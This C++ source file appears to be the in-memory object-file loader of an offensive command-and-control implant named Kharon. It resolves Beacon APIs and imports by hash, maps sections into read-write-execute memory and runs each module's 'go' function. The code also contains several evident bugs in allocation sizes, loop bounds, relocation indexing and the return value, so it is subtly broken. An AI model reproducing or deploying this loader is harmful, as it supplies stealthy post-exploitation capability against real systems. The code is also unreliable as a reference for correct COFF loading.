#include <Kharon.h>

typedef struct {
    PVOID Base;
    ULONG Size;
} SECTION_DATA;

typedef struct {
    PCHAR Name;
    ULONG Hash;
    UINT8 Type; // ( COFF_VAR | COFF_FNC | COFF_IMP )
    PVOID Ptr;
} SYMBOL_DATA;

typedef struct {
    SYMBOL_DATA*  Sym;
    SECTION_DATA* Sec;
} COFF_DATA;

auto Coff::RslRel(
    _In_ PVOID  Base,
    _In_ PVOID  Rel,
    _In_ UINT16 Type
) -> VOID {
    PVOID FlRel = (PVOID)((ULONG_PTR)Base + *(UINT32*)Rel);

    switch (Type) {
        case IMAGE_REL_AMD64_REL32:
            *(UINT32*)Rel = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32)); break;
        case IMAGE_REL_AMD64_REL32_1:
            *(UINT32*)Rel = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 1); break;
        case IMAGE_REL_AMD64_REL32_2:
            *(UINT32*)Rel = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 2); break;
        case IMAGE_REL_AMD64_REL32_3:
            *(UINT32*)Rel = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 3); break;
        case IMAGE_REL_AMD64_REL32_4:
            *(UINT32*)Rel = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 4); break;
        case IMAGE_REL_AMD64_REL32_5:
            *(UINT32*)Rel = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 5); break;
        case IMAGE_REL_AMD64_ADDR64:
            *(UINT64*)Rel = (UINT64)(ULONG_PTR)FlRel; break;
    }
}

auto Coff::RslApi(
    _In_ PCHAR SymName
) -> PVOID {
    PVOID ApiAddress = nullptr;

    KhDbg("Starting resolution for symbol %s", SymName);
    SymName += 6;
    
    if ( Str::CompareCountA( SymName, "Beacon", 6 ) == 0 ) {
        for ( int i = 0; i < sizeof( ApiTable ) / sizeof( ApiTable[0] ); i++ ) {
            KhDbg("Checking ApiTable[%d] (Hash: 0x%X vs Target: 0x%X)", i, ApiTable[i].SymHash, Hsh::Str( SymName ));
            if ( Hsh::Str( SymName ) == ApiTable[i].SymHash ) {
                ApiAddress = ApiTable[i].SymPtr;
                KhDbg("Found match at index %d (Address: 0x%p)", i, ApiAddress);
                break;
            }
        }
    }

    KhDbg("symbol not in ApiTable, attempting dynamic resolution");

    if ( !ApiAddress ) {
        CHAR RawBuff[MAX_PATH];

        PCHAR LibName = nullptr;
        PCHAR FncName = nullptr;
        BYTE  OffSet  = 0;

        PVOID LibPtr = nullptr;
        PVOID FncPtr = nullptr;

        Mem::Zero( (UPTR)RawBuff, sizeof( RawBuff ) );
        Mem::Copy( RawBuff, SymName, Str::LengthA( SymName ) );
        KhDbg("raw symbol name: %s %d", RawBuff, sizeof(RawBuff) );

        for ( INT i = 0; i < sizeof( RawBuff ); i++ ) {
            if ( ( RawBuff[i] == (CHAR)'$' ) ) {
                OffSet = i; RawBuff[i] = 0;
                KhDbg("found delimiter at offset %d", OffSet);
                break;
            }
        }

        LibName = RawBuff;
        FncName = &RawBuff[OffSet+1];

        Str::ToLowerChar( LibName );
        Str::ToLowerChar( FncName );

        INT totalLength = Str::LengthA(LibName) + Str::LengthA(".dll") + 1;

        CHAR LibNameOrg[totalLength];

        Mem::Copy(LibNameOrg, LibName, Str::LengthA(LibName));
        Mem::Copy(LibNameOrg + Str::LengthA(LibName), (PCHAR)".dll", Str::LengthA(".dll"));

        LibNameOrg[totalLength - 1] = '\0';

        KhDbg("lib name: %s fnc name: %s", LibNameOrg, FncName);

        LibPtr = (PVOID)LdrLoad::Module( Hsh::Str<CHAR>( LibNameOrg ) );
        KhDbg("lib found at %p", LibPtr);
        if ( !LibPtr ) {
            KhDbg("loading library %s dynamically", LibNameOrg);
            LibPtr = (PVOID)Self->Lib->Load( (PCHAR)LibNameOrg );
            KhDbg("lib found at %p", LibPtr);
        }

        KhDbg("resolving function %s in library 0x%p", FncName, LibPtr);
        FncPtr = LdrLoad::Api<PVOID>( (UPTR)LibPtr, Hsh::Str<CHAR>( FncName ) );
        
        if ( FncPtr ) {
            ApiAddress = FncPtr;
            KhDbg("resolved address: 0x%p", ApiAddress);
        }
    }

    KhDbg("returning address: 0x%p", ApiAddress);
    return ApiAddress;
}

auto Coff::Loader(
    _In_ PBYTE Buffer,
    _In_ ULONG Size,
    _In_ PBYTE Args,
    _In_ ULONG Argc
) -> BOOL {
    PVOID MmBase  = NULL;
    ULONG MmSize  = 0;
    PVOID TmpBase = NULL;

    ULONG SecNbrs = 0;
    ULONG SymNbrs = 0;

    ULONG SecLength = 0;
    UINT8 Iterator  = 0;

    PIMAGE_FILE_HEADER    Header  = { 0 };
    PIMAGE_SECTION_HEADER SecHdr  = { 0 };
    PIMAGE_SYMBOL         Symbols = { 0 };
    PIMAGE_RELOCATION     Relocs  = { 0 };

    KhDbg("starting COFF loading process");

    // parse the coff file

    Header  = (PIMAGE_FILE_HEADER)Buffer;
    SecHdr  = (PIMAGE_SECTION_HEADER)( Buffer + sizeof( IMAGE_FILE_HEADER ) );
    SecNbrs = Header->NumberOfSections;
    SymNbrs = Header->NumberOfSymbols;
    Symbols = (PIMAGE_SYMBOL)( Buffer + Header->PointerToSymbolTable );
    
    KhDbg("found %d sections and %d symbols", SecNbrs, SymNbrs);
    
    COFF_DATA CoffData = { 0 };

    // allocate memory to temporary symbol and section array

    CoffData.Sec = (SECTION_DATA*)Self->Hp->Alloc( SecNbrs * sizeof( SECTION_DATA ) );
    CoffData.Sym = (SYMBOL_DATA*)Self->Hp->Alloc( SecNbrs * sizeof( SYMBOL_DATA ) );
    KhDbg("allocated %d bytes for sections and %d bytes for symbols", 
          SecNbrs * sizeof( SECTION_DATA ), SecNbrs * sizeof( SYMBOL_DATA ));

    // get symbols name and resolving the beacon apis

    for ( INT i = 0; i < SymNbrs; i++ ) {
        PCHAR SymName      = nullptr;
        BYTE  StorageClass = 0;

        if ( Symbols[i].N.Name.Short ) {
            SymName = A_PTR( &Symbols[i].N.ShortName );
        } else {
            SymName = A_PTR( U_PTR(Buffer) + Header->PointerToSymbolTable + ( SymNbrs * sizeof(IMAGE_SYMBOL) ) + Symbols[i].N.Name.Long );
        }

        CoffData.Sym[i].Name = SymName;
        CoffData.Sym[i].Hash = Hsh::Str<CHAR>( SymName );
        StorageClass         = Symbols[i].StorageClass;

        KhDbg("processing symbol %d: %s (Class: 0x%X)", i, SymName, StorageClass);

        if ( 
            Str::CompareCountA( "__imp_", SymName, 6 ) == 0
        ) {
            MmSize += sizeof( PVOID );
            CoffData.Sym[i].Type = COFF_IMP;
            CoffData.Sym[i].Ptr  = this->RslApi( SymName );
            KhDbg("import symbol resolved to 0x%p", CoffData.Sym[i].Ptr);
        } else if ( ISFCN( Symbols[i].Type ) ) {
            CoffData.Sym[i].Type = COFF_FNC;

            if ( Str::CompareA( SymName, "go" ) == 0 ) {
                CoffData.Sym[i].Ptr = (PVOID)Symbols[i].Value;
            }
        } else if (
            !ISFCN( Symbols[i].Type )                &&
            StorageClass == IMAGE_SYM_CLASS_EXTERNAL && 
            !Str::CompareCountA( "__imp_", SymName, 6 )
        ) {
            CoffData.Sym[i].Type = COFF_VAR;
            KhDbg("variable symbol identified");
        }

        MmSize += PAGE_ALIGN( MmSize );
    }

    // align size of memory allocate

    for ( INT i = 0; i < SymNbrs; i++ ) {
        MmSize += PAGE_ALIGN( SecHdr[i].SizeOfRawData );
    }

    // allocate memory to coff execution

    KhDbg("total memory required: %d bytes", MmSize);
    MmBase = Self->Mm->Alloc( nullptr, nullptr, MmSize, MEM_COMMIT, 0x40 );
    KhDbg("allocated memory at 0x%p", MmBase);

    TmpBase = MmBase;

    // copy data to memory allocated

    for ( INT i = 0; i < SecNbrs; i++ ) {
        KhDbg("copying section %d (VA: 0x%p, Size: %d)", i, SecHdr[i].VirtualAddress, SecHdr[i].SizeOfRawData);
        CoffData.Sec[i].Base = TmpBase;
        CoffData.Sec[i].Size = SecHdr[i].SizeOfRawData;

        KhDbg("[x] section\n\t- name: %s\n\t- base: %p\n\t- size: %d", SecHdr[i].Name, CoffData.Sec[i].Base, CoffData.Sec[i].Size );

        Mem::Copy(
            C_PTR( U_PTR( TmpBase ) + SecHdr[i].VirtualAddress ),
            C_PTR( U_PTR( Buffer )  + SecHdr[i].PointerToRawData ),
            SecHdr[i].SizeOfRawData
        );

        TmpBase = (PVOID)PAGE_ALIGN( U_PTR( TmpBase ) + SecHdr[i].SizeOfRawData );
    }

    // make the section and symbol relocations

    {
        for ( INT i = 0; i < SecNbrs; i++ ) {
            Relocs = (PIMAGE_RELOCATION)(Buffer + SecHdr[i].PointerToRelocations);
            KhDbg("processing %d relocations for section %d", SecHdr[i].NumberOfRelocations, i);

            for ( INT x = 0; x < SecHdr[i].NumberOfRelocations; x++ ) {
                PIMAGE_SYMBOL SymReloc = &Symbols[Relocs->SymbolTableIndex];

                PVOID TmpBase = C_PTR((ULONG_PTR)CoffData.Sec[i].Base + Relocs->VirtualAddress);

                KhDbg( "section base %p [%d bytes]", CoffData.Sec[i].Base, CoffData.Sec[i].Size );
                KhDbg("processing relocation %d (Type: 0x%X)", x, Relocs[x].Type);

                if ( Relocs[x].Type == IMAGE_REL_AMD64_REL32 && CoffData.Sym[i].Ptr ) {
                    ULONG_PTR* Ptr = (ULONG_PTR*)TmpBase;
                    Ptr[Iterator]  = (DWORD)CoffData.Sym[i].Ptr;

                    KhDbg("address to reloc %p %p", Ptr, TmpBase);

                    C_DEF32(SymReloc) = (UINT32)((ULONG_PTR)TmpBase + Iterator * sizeof(PVOID) - U_PTR(Relocs) - sizeof(INT32));
                    Iterator++;
                    KhDbg("applied REL32 relocation");
                } else {
                    this->RslRel( CoffData.Sec[i].Base, SymReloc, Relocs[x].Type );
                    KhDbg("applied other relocation type");
                }

                Relocs = (PIMAGE_RELOCATION)( (ULONG_PTR)Relocs + sizeof(IMAGE_RELOCATION) );
            }
        }
    }

    for ( INT i = 0; i < SymNbrs; i++ ) {
        if ( 
             CoffData.Sym[i].Type == COFF_FNC && 
             CoffData.Sym[i].Hash == Hsh::Str<CHAR>( "go" ) 
        ) {
            for ( INT j = 0; j < SecNbrs; j++ ) {
                if ( Symbols[i].SectionNumber == j + 1 ) { 
                    PVOID GoPtr = C_PTR( U_PTR( CoffData.Sec[j].Base ) + Symbols[i].Value );
                    
                    KhDbg("found 'go' function at 0x%p (Section %d, Offset 0x%X)", GoPtr, j, Symbols[i].Value);
                    
                    VOID ( *Go )( PBYTE, ULONG ) = ( decltype( Go ) )( GoPtr );
                    
                    ULONG OldProt = 0;

                    KhDbg("calling 'go' function");
                    Go( Args, Argc );

                    KhDbg("restored memory protection");
                            
                }
            }
        }
    }

    KhDbg("COFF loading completed");
}